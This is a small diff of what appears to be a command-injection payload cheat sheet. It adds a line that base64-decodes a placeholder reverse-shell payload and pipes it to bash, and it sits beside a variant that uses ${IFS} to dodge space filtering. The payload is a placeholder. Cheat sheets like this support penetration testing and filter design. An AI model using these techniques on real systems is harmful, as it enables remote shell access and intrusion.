@@ -6,6 +6,10 @@
 
 #### 2) 
 
+    echo 'BASE64_REVSHELL'|base64 -d|bash
+
+Space delimiter
+
     echo${IFS}BASE64_SHELL|base64${IFS}-d|bash
 
 #### 3) Powershell Encoded:
